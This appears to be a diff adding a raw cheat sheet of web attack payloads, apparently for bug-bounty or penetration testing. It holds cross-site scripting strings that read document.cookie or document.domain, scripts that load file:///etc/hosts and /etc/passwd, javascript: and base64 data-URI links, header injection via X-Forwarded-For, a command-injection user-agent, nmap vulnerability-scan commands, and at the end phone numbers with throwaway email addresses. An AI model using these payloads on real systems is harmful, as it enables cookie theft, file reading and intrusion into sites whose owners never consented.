@@ -1,0 +1,38 @@
+<script>alert('xss');</script>
+<img%20src='aaa'%20onerror=alert(1)>
+<img%20src=x%20onerror=alert(document.domain)>
+		<img class="emoji" alt="😯" src="x" /><svg onload=prompt(document.domain)>
+/track/?url=javascript:throw%20onerror=alert,document.domain
+		<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+		‘img src=a onerror=alert(document.cookie)>’ 
+		<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();</script>
+		%3Cimg+src%3Dx+onerror%3Dalert%281%29%3B%3E
+		<a href="https://google.com"></a>
+		"header__wrap"><a/href=javascript:alert(0)><h1>pwn3d</h1></a>
+		<img/src=//unskid.me/dist/jesus.gif></div>
+		<a href="javascript:alert(0)">click here</a>
+		<meta http-equiv="refresh" content="2;url=http://bing.com"/>
+		<iframe src="https://www.bing.com/"></iframe>
+		<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">asd</a>
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+?view=%3Cscript%3Ealert(%22xElkomy%22)%3C/script%3E
+?referer=javascript:alert(document.domain)
+X-Forwarded-For', 'X-Forwarded-Host' and 'X-Forwarded-Server'
+nmap -Pn -sC -sV -d --script vuln
+nmap -sV --script ssl-enum-ciphers -p 443
+
+cmd inejction useragent: |sleep 0 & ping -n 0 localhost
+
+frame contains <name>
+X-Forworded-For: <svg/onload=alert(document.domain)>
+X-Fowarded-Host: 
+
+
+<form>  
+    First Name: <input type="text" name="firstname"/> <br/>  
+    Last Name:  <input type="text" name="lastname"/> <br/>  
+ </form>  
+
+7428730894 fofecil583@ishop2k.com 27481852
+9632704968 dotes96021@ishop2k.com 27482012
